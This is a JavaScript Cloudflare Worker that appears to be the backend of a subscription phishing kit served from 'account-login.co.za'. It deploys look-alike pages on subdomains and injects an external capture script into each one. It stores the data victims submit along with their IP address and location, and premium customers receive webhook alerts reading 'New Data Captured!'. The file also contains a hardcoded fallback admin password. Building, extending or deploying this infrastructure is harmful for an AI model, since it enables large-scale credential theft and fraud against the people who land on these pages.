/**
 * 🚀 D-TECH GLOBAL ROUTER V7.0 (API ONLY)
 * LOCATION: Cloudflare Worker
 */

const COOKIE_NAME = "admin_session";
const ROOT_DOMAIN = "account-login.co.za";

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const domain = url.hostname; 

    // --- CORS HANDLING ---
    if (request.method === 'OPTIONS') {
      return handleOptions(request);
    }

    // Helper to wrap response with CORS headers
    const respond = (response) => {
        const corsHeaders = getCorsHeaders(request);
        const newHeaders = new Headers(response.headers);
        Object.entries(corsHeaders).forEach(([k, v]) => newHeaders.set(k, v));

        return new Response(response.body, {
            status: response.status,
            statusText: response.statusText,
            headers: newHeaders
        });
    };

    // --- 1. ADMIN AUTHENTICATION & ROUTES ---
    const isAdminPath = url.pathname.startsWith('/admin') ||
                        url.pathname === '/api/save' ||
                        (url.pathname === '/api/captures' && request.method === 'GET') ||
                        url.pathname.startsWith('/api/admin');

    if (isAdminPath) {
        if (url.pathname === '/admin/login' && request.method === 'POST') {
            return respond(await handleLogin(request, env));
        }

        const isAuth = await checkAuth(request, env);
        if (!isAuth) {
            return respond(new Response(JSON.stringify({ success: false, error: "Unauthorized" }), {
                status: 401,
                headers: {'Content-Type': 'application/json'}
            }));
        }

        if (url.pathname === '/api/save' && request.method === 'POST') {
            return respond(await handleSaveRequest(request, env));
        }

        if (url.pathname === '/api/captures' && request.method === 'GET') {
            return respond(await handleGetCaptures(env));
        }

        if (url.pathname === '/api/admin/templates') {
             if (request.method === 'GET') return respond(await handleGetTemplates(env));
             if (request.method === 'POST') return respond(await handleSaveTemplate(request, env));
             if (request.method === 'DELETE') return respond(await handleDeleteTemplate(request, env));
        }

        if (url.pathname === '/api/admin/sites') {
             if (request.method === 'GET') return respond(await handleGetSites(env));
             if (request.method === 'DELETE') return respond(await handleDeleteSite(request, env));
        }

        // Admin Payment & User Management
        if (url.pathname === '/api/admin/vouchers') {
             if (request.method === 'GET') return respond(await handleGetVouchers(env));
        }
        if (url.pathname === '/api/admin/voucher_action' && request.method === 'POST') {
             return respond(await handleVoucherAction(request, env));
        }
        if (url.pathname === '/api/admin/users' && request.method === 'GET') {
             return respond(await handleGetUsers(env));
        }

        return respond(new Response("Not Found", { status: 404 }));
    }

    // --- 2. PUBLIC API ENDPOINTS ---

    if (url.pathname === '/api/public/captures') {
        if (request.method === 'GET') return respond(await handleGetPublicCaptures(request, env));
        if (request.method === 'DELETE') return respond(await handleDeletePublicCapture(request, env));
    }

    if (url.pathname === '/api/public/sites' && request.method === 'DELETE') {
        return respond(await handleDeletePublicSite(request, env));
    }

    if (url.pathname === '/api/public/check-subdomain' && request.method === 'GET') {
        return respond(await handleCheckSubdomain(request, env));
    }

    if (url.pathname === '/api/capture' && request.method === 'POST') {
      return respond(await handleCaptureRequest(request, env, ctx));
    }

    if (url.pathname === '/api/public/deploy' && request.method === 'POST') {
        return respond(await handlePublicDeploy(request, env, ROOT_DOMAIN));
    }

    if (url.pathname === '/api/public/templates' && request.method === 'GET') {
        return respond(await handleGetPublicTemplates(env));
    }

    // Payment Submission
    if (url.pathname === '/api/pay' && request.method === 'POST') {
        return respond(await handlePaymentSubmit(request, env));
    }

    // User Settings (Webhooks)
    if (url.pathname === '/api/user/settings') {
        if (request.method === 'POST') return respond(await handleSaveSettings(request, env));
        if (request.method === 'GET') return respond(await handleGetSettings(request, env));
    }

    // --- 3. SUBDOMAIN ROUTING ---

    let subdomain = null;
    if (domain !== ROOT_DOMAIN && domain.endsWith("." + ROOT_DOMAIN)) {
        subdomain = domain.slice(0, - (ROOT_DOMAIN.length + 1));
    }

    if (subdomain && subdomain !== 'www') {
        const data = await env.SUBDOMAINS.get(subdomain, { type: "json" });

        if (!data) {
           return new Response(`<html><body><h1>404</h1><p>Subdomain not found.</p></body></html>`, {
               status: 404,
               headers: { 'Content-Type': 'text/html' }
           });
        }

        if (data.type === 'HTML') {
          return new Response(data.content, {
            headers: { 'Content-Type': 'text/html' }
          });
        }

        if (data.type === 'PROXY') {
          try {
            const targetUrl = data.content;
            const forwardUrl = new URL(targetUrl);
            forwardUrl.pathname = url.pathname === '/' ? forwardUrl.pathname : url.pathname;
            forwardUrl.search = url.search;

            const proxyResponse = await fetch(forwardUrl.toString(), {
              headers: {
                'User-Agent': request.headers.get('User-Agent') || 'D-TECH Cloud Proxy',
              }
            });

            const response = new Response(proxyResponse.body, proxyResponse);
            return response;

          } catch (err) {
            return new Response(`<h1>Proxy Error</h1><p>${err.message}</p>`, { status: 502, headers: {'Content-Type': 'text/html'} });
          }
        }
    }

    return new Response(JSON.stringify({ message: "D-TECH API Service Online" }), {
        headers: { 'Content-Type': 'application/json' }
    });
  }
};

// --- CORE LOGIC & HELPERS ---

async function getUser(env, code) {
    const key = `user::${code}`;
    const user = await env.SUBDOMAINS.get(key, { type: "json" });
    if (!user) {
        // Default Free User
        return {
            plan: 'free', // free, basic, premium
            strikes: 0,
            status: 'active', // active, locked, banned
            created: Date.now(),
            expiry: null,
            webhookUrl: null
        };
    }

    // Check Expiry
    if (user.expiry && Date.now() > user.expiry) {
        user.plan = 'free';
        user.expiry = null;
        await env.SUBDOMAINS.put(key, JSON.stringify(user));
    }

    return user;
}

async function saveUser(env, code, data) {
    await env.SUBDOMAINS.put(`user::${code}`, JSON.stringify(data));
}

// --- HANDLERS ---

function getCorsHeaders(request) {
    const origin = request.headers.get('Origin');
    const allowedDomain = 'https://account-login.co.za';
    const newFrontend = 'https://new.preasx24.co.za';

    if (origin === allowedDomain || origin === newFrontend || (origin && origin.endsWith('.account-login.co.za'))) {
        return {
            'Access-Control-Allow-Origin': origin,
            'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Allow-Credentials': 'true'
        };
    }
    return {};
}

function handleOptions(request) {
    const headers = getCorsHeaders(request);
    return new Response(null, { headers: headers });
}

async function checkAuth(request, env) {
  const cookieHeader = request.headers.get('Cookie');
  if (!cookieHeader) return false;
  const pwd = env.ADMIN_PASSWORD || "admin-secret-123";
  return cookieHeader.includes(`${COOKIE_NAME}=${pwd}`);
}

async function handleLogin(request, env) {
    try {
        const formData = await request.formData();
        const password = formData.get('password');
        const pwd = env.ADMIN_PASSWORD || "admin-secret-123";
        if (password === pwd) {
            return new Response(JSON.stringify({ success: true }), {
                headers: {
                    'Content-Type': 'application/json',
                    'Set-Cookie': `${COOKIE_NAME}=${pwd}; Path=/; HttpOnly; SameSite=None; Secure; Max-Age=86400`
                }
            });
        }
        return new Response(JSON.stringify({ success: false, error: "Invalid Password" }), {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        return jsonError("Error processing request");
    }
}

async function handleSaveRequest(request, env) {
  try {
    const body = await request.json();
    const { subdomain, type, content } = body;
    if (!subdomain || !type || !content) return jsonError("Missing fields");

    const entry = { type, content, updated: Date.now() };
    await env.SUBDOMAINS.put(subdomain, JSON.stringify(entry));
    return new Response(JSON.stringify({ success: true, subdomain, type }), { headers: { 'Content-Type': 'application/json' } });
  } catch (err) {
    return jsonError(err.message, 500);
  }
}

async function handleCaptureRequest(request, env, ctx) {
  try {
    const ip = request.headers.get('CF-Connecting-IP') || 'Unknown';
    const allowed = await checkRateLimit(env, ip, 'capture', 60, 60); // 60 req/min
    if (!allowed) return jsonError("Rate limit exceeded", 429);

    const body = await request.json();
    const timestamp = Date.now();
    const uuid = crypto.randomUUID();
    const uniqueCode = body.uniqueCode || 'default';
    const key = `capture::${uniqueCode}::${timestamp}::${uuid}`;

    // Extract Intelligence Metadata
    const cf = request.cf || {};
    const meta = {
        ip: ip,
        country: cf.country || 'Unknown',
        city: cf.city || 'Unknown',
        asn: cf.asn || '',
        userAgent: request.headers.get('User-Agent') || 'Unknown'
    };

    const entry = { timestamp, data: body, meta };
    await env.SUBDOMAINS.put(key, JSON.stringify(entry));

    // Webhook Trigger (Async)
    const user = await getUser(env, uniqueCode);
    if (user.plan === 'premium' && user.webhookUrl) {
        const payload = {
            content: "🚨 **New Data Captured!**",
            embeds: [{
                title: "Capture Details",
                fields: [
                    { name: "Subdomain", value: body.url || "Unknown", inline: true },
                    { name: "IP Address", value: meta.ip, inline: true },
                    { name: "Location", value: `${meta.city}, ${meta.country}`, inline: true },
                    { name: "User Agent", value: meta.userAgent }
                ],
                color: 16763907 // Gold
            }]
        };

        if (ctx && ctx.waitUntil) {
            ctx.waitUntil(
                fetch(user.webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(err => console.error("Webhook Failed", err))
            );
        }
    }

    return new Response(JSON.stringify({ success: true, key }), { headers: { 'Content-Type': 'application/json' } });
  } catch (err) {
    return jsonError(err.message, 500);
  }
}

async function handleGetCaptures(env) {
  try {
    const list = await env.SUBDOMAINS.list({ prefix: "capture::" });
    const keys = list.keys.slice(-20).reverse();
    const promises = keys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });
    const results = await Promise.all(promises);
    return new Response(JSON.stringify({ success: true, data: results }), { headers: { 'Content-Type': 'application/json' } });
  } catch (err) {
     return jsonError(err.message, 500);
  }
}

async function handleGetTemplates(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "template::" });
    const templates = await Promise.all(list.keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { name: k.name.replace("template::", ""), ...val };
    }));
    return new Response(JSON.stringify({ success: true, data: templates }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleGetSites(env) {
    try {
        const list = await env.SUBDOMAINS.list();
        const sites = [];
        for (const k of list.keys) {
            if (!k.name.startsWith('capture::') && !k.name.startsWith('template::') &&
                !k.name.startsWith('code_map::') && !k.name.startsWith('user::') &&
                !k.name.startsWith('voucher_queue')) {
                sites.push(k.name);
            }
        }
        return new Response(JSON.stringify({ success: true, data: sites }), { headers: { 'Content-Type': 'application/json' } });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetPublicTemplates(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "template::" });
    const templates = await Promise.all(list.keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { name: k.name.replace("template::", ""), previewUrl: val.previewUrl };
    }));
    return new Response(JSON.stringify({ success: true, data: templates }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleSaveTemplate(request, env) {
    const body = await request.json();
    const { name, content, redirectUrl, previewUrl } = body;
    if (!name || !content) return jsonError("Missing fields");
    await env.SUBDOMAINS.put(`template::${name}`, JSON.stringify({ content, redirectUrl, previewUrl, updated: Date.now() }));
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeleteTemplate(request, env) {
    const url = new URL(request.url);
    const name = url.searchParams.get('name');
    if (!name) return jsonError("Missing name");
    await env.SUBDOMAINS.delete(`template::${name}`);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeleteSite(request, env) {
    const url = new URL(request.url);
    const subdomain = url.searchParams.get('subdomain');
    if (!subdomain) return jsonError("Missing subdomain");

    try {
        const siteData = await env.SUBDOMAINS.get(subdomain, { type: "json" });
        if (siteData && siteData.ownerCode) {
            const mapKey = `code_map::${siteData.ownerCode}`;
            const mapData = await env.SUBDOMAINS.get(mapKey, { type: "json" });
            if (mapData) {
                let newSites = [];
                if (Array.isArray(mapData.sites)) {
                    newSites = mapData.sites.filter(s => s.subdomain !== subdomain);
                } else if (mapData.subdomain === subdomain) {
                    newSites = [];
                }

                if (newSites.length > 0) {
                     await env.SUBDOMAINS.put(mapKey, JSON.stringify({ sites: newSites }));
                } else {
                     await env.SUBDOMAINS.delete(mapKey);
                }
            }
        }
    } catch (e) {}

    await env.SUBDOMAINS.delete(subdomain);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handlePublicDeploy(request, env, rootDomain) {
    try {
        const ip = request.headers.get('CF-Connecting-IP') || 'Unknown';
        const allowed = await checkRateLimit(env, ip, 'deploy', 10, 3600); // 10 req/hour
        if (!allowed) return jsonError("Rate limit exceeded. Try again later.", 429);

        const body = await request.json();
        let { subdomain, uniqueCode, templateName, customHtml, enableInjector, redirectUrl } = body;

        if (!subdomain || !uniqueCode) return jsonError("Missing subdomain or unique code");
        if (!/^[a-zA-Z0-9-]+$/.test(subdomain)) return jsonError("Invalid subdomain format");

        const user = await getUser(env, uniqueCode);

        if (user.status === 'locked' || user.status === 'banned') {
            return jsonError("Account is locked due to payment issues. Contact support.");
        }

        const mapKey = `code_map::${uniqueCode}`;
        let codeMap = await env.SUBDOMAINS.get(mapKey, { type: "json" });

        let currentSites = [];
        if (codeMap) {
            if (Array.isArray(codeMap.sites)) {
                currentSites = codeMap.sites;
            } else if (codeMap.subdomain) {
                currentSites = [{ subdomain: codeMap.subdomain, created: codeMap.created }];
            }
        }

        let limit = 1; // Free
        if (user.plan === 'basic') limit = 3;
        if (user.plan === 'premium') limit = 15;

        if (currentSites.length >= limit) {
             return jsonError(`Plan limit reached (${limit} sites). Delete a site to deploy a new one.`);
        }

        const existingSub = await env.SUBDOMAINS.get(subdomain);
        if (existingSub) {
            const siteJson = JSON.parse(existingSub);
            if (siteJson.ownerCode !== uniqueCode) {
                return jsonError("Subdomain already taken");
            }
        }

        let htmlContent = '';
        let shouldInject = false;

        if (templateName) {
            const templateData = await env.SUBDOMAINS.get(`template::${templateName}`, { type: "json" });
            if (!templateData) return jsonError("Template not found");
            htmlContent = templateData.content;
            redirectUrl = templateData.redirectUrl || null;
            shouldInject = true;
        } else if (customHtml) {
            htmlContent = customHtml;
            shouldInject = (enableInjector === true);
            if (!redirectUrl) redirectUrl = null;
        } else {
            return jsonError("Must provide a template or custom HTML");
        }

        const scriptUrl = 'https://new.preasx24.co.za/injection.js';
        if (shouldInject) {
            let injectionBlock = `<script>window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};</script>`;

            if (redirectUrl) {
                injectionBlock += `<script>window.REDIRECT_URL = ${JSON.stringify(redirectUrl)};</script>`;
            }

            injectionBlock += `<script src="${scriptUrl}"></script>`;

            if (htmlContent.includes('</body>')) {
                htmlContent = htmlContent.replace('</body>', `${injectionBlock}</body>`);
            } else {
                htmlContent += injectionBlock;
            }
        }

        await env.SUBDOMAINS.put(subdomain, JSON.stringify({
            type: 'HTML',
            content: htmlContent,
            updated: Date.now(),
            ownerCode: uniqueCode,
            isInjected: shouldInject
        }));

        currentSites.push({ subdomain, created: Date.now() });
        await env.SUBDOMAINS.put(mapKey, JSON.stringify({ sites: currentSites }));

        return new Response(JSON.stringify({ success: true, url: `https://${subdomain}.${rootDomain}` }), {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetPublicCaptures(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    if (!code) return jsonError("Missing code");

    const user = await getUser(env, code);

    if (user.status === 'locked' || user.status === 'banned') {
         return new Response(JSON.stringify({
             success: false,
             error: "Account Locked",
             accountStatus: user.status
         }), { headers: { 'Content-Type': 'application/json' } });
    }

    const mapKey = `code_map::${code}`;
    const codeMap = await env.SUBDOMAINS.get(mapKey, { type: "json" });
    let siteCount = 0;
    let sites = [];

    if (codeMap) {
        if (Array.isArray(codeMap.sites)) {
            sites = codeMap.sites;
            siteCount = sites.length;
        } else if (codeMap.subdomain) {
            sites = [{ subdomain: codeMap.subdomain, created: codeMap.created }];
            siteCount = 1;
        }
    }

    const list = await env.SUBDOMAINS.list({ prefix: `capture::${code}::` });
    const keys = list.keys.reverse();
    const totalCount = keys.length;

    let limit = 5; // Free
    if (user.plan === 'basic') limit = 15;
    if (user.plan === 'premium') limit = 10000; // Unlimited

    const visibleKeys = keys.slice(0, limit);
    const hiddenCount = Math.max(0, totalCount - limit);

    const promises = visibleKeys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });

    const results = await Promise.all(promises);
    return new Response(JSON.stringify({
        success: true,
        data: results,
        total: totalCount,
        hidden: hiddenCount,
        plan: user.plan,
        expiry: user.expiry,
        lastPayment: user.lastPaymentDate,
        siteCount: siteCount,
        sites: sites,
        webhookUrl: user.webhookUrl // Include settings
    }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeletePublicSite(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    const subdomain = url.searchParams.get('subdomain');

    if (!code || !subdomain) return jsonError("Missing fields");

    const mapKey = `code_map::${code}`;
    const codeMap = await env.SUBDOMAINS.get(mapKey, { type: "json" });
    let sites = [];
    if (codeMap) {
        if (Array.isArray(codeMap.sites)) sites = codeMap.sites;
        else if (codeMap.subdomain) sites = [{ subdomain: codeMap.subdomain }];
    }

    const ownsSite = sites.some(s => s.subdomain === subdomain);
    if (!ownsSite) return jsonError("Unauthorized: Site not found in your account", 403);

    await env.SUBDOMAINS.delete(subdomain);

    const newSites = sites.filter(s => s.subdomain !== subdomain);
    if (newSites.length > 0) {
        await env.SUBDOMAINS.put(mapKey, JSON.stringify({ sites: newSites }));
    } else {
        await env.SUBDOMAINS.delete(mapKey);
    }

    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleCheckSubdomain(request, env) {
    const url = new URL(request.url);
    const subdomain = url.searchParams.get('subdomain');
    if (!subdomain) return jsonError("Missing subdomain");

    const val = await env.SUBDOMAINS.get(subdomain);
    return new Response(JSON.stringify({ success: true, available: !val }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeletePublicCapture(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    const key = url.searchParams.get('key');
    if (!code || !key) return jsonError("Missing fields");

    if (!key.startsWith(`capture::${code}::`)) return jsonError("Unauthorized deletion", 403);

    await env.SUBDOMAINS.delete(key);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handlePaymentSubmit(request, env) {
    try {
        const body = await request.json();
        const { uniqueCode, voucherType, voucherCode } = body;
        if (!uniqueCode || !voucherType || !voucherCode) return jsonError("Missing fields");

        const user = await getUser(env, uniqueCode);
        if (user.status === 'banned') return jsonError("Account is permanently banned.");

        const plan = body.plan || 'premium';

        // Check for pending vouchers of same plan
        const list = await env.SUBDOMAINS.list({ prefix: "voucher_queue::" });
        for (const k of list.keys) {
            const v = await env.SUBDOMAINS.get(k.name, { type: "json" });
            if (v && v.uniqueCode === uniqueCode && v.status === 'pending' && v.plan === plan) {
                return jsonError(`You already have a pending ${plan.toUpperCase()} voucher request. Please wait for approval.`);
            }
        }

        user.plan = plan;
        await saveUser(env, uniqueCode, user);

        const voucherId = crypto.randomUUID();
        const voucherData = {
            id: voucherId,
            uniqueCode,
            voucherType,
            voucherCode,
            plan,
            submitted: Date.now(),
            status: 'pending'
        };

        await env.SUBDOMAINS.put(`voucher_queue::${voucherId}`, JSON.stringify(voucherData));

        return new Response(JSON.stringify({ success: true, message: "Payment submitted. Access granted pending review." }), {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleSaveSettings(request, env) {
    try {
        const body = await request.json();
        const { uniqueCode, webhookUrl } = body;
        if (!uniqueCode) return jsonError("Missing unique code");

        const user = await getUser(env, uniqueCode);

        if (user.plan !== 'premium' && webhookUrl) {
             return jsonError("Webhooks are a Premium feature. Upgrade to Premium to use this.", 403);
        }

        if (webhookUrl) {
            try {
                new URL(webhookUrl);
            } catch (e) {
                return jsonError("Invalid Webhook URL");
            }
        }

        user.webhookUrl = webhookUrl || null;
        await saveUser(env, uniqueCode, user);

        return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetSettings(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    if (!code) return jsonError("Missing code");

    const user = await getUser(env, code);
    return new Response(JSON.stringify({
        success: true,
        webhookUrl: user.webhookUrl || ""
    }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleGetVouchers(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "voucher_queue::" });
    const vouchers = await Promise.all(list.keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return val;
    }));
    const pending = vouchers.filter(v => v.status === 'pending');
    return new Response(JSON.stringify({ success: true, data: pending }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleVoucherAction(request, env) {
    try {
        const body = await request.json();
        const { voucherId, action, reason } = body;

        const voucherKey = `voucher_queue::${voucherId}`;
        const voucher = await env.SUBDOMAINS.get(voucherKey, { type: "json" });
        if (!voucher) return jsonError("Voucher not found");

        const user = await getUser(env, voucher.uniqueCode);

        if (action === 'approve') {
            const now = Date.now();
            let currentExpiry = user.expiry || now;
            if (currentExpiry < now) currentExpiry = now;

            user.expiry = currentExpiry + (30 * 24 * 60 * 60 * 1000);
            user.lastPaymentDate = now;
            user.status = 'active';

            await env.SUBDOMAINS.delete(voucherKey);

        } else if (action === 'decline') {
            user.plan = 'free';
            user.status = 'locked';
            user.strikes = (user.strikes || 0) + 1;
            user.lockReason = reason || "Invalid Voucher";

            if (user.strikes >= 2) {
                user.status = 'banned';
            }

            await env.SUBDOMAINS.delete(voucherKey);
        }

        await saveUser(env, voucher.uniqueCode, user);

        return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetUsers(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "user::" });
    const users = await Promise.all(list.keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { code: k.name.replace("user::", ""), ...val };
    }));
    return new Response(JSON.stringify({ success: true, data: users }), { headers: { 'Content-Type': 'application/json' } });
}

function jsonError(msg, status = 400) {
    return new Response(JSON.stringify({ success: false, error: msg }), { status: status, headers: { 'Content-Type': 'application/json' } });
}

async function checkRateLimit(env, ip, action, limit, windowSeconds) {
    try {
        const key = `ratelimit::${action}::${ip}`;
        const countStr = await env.SUBDOMAINS.get(key);
        const count = countStr ? parseInt(countStr) : 0;

        if (count >= limit) return false;

        const newCount = count + 1;
        await env.SUBDOMAINS.put(key, newCount.toString(), { expirationTtl: windowSeconds });
        return true;
    } catch(e) {
        return true; // Fail open if KV error
    }
}
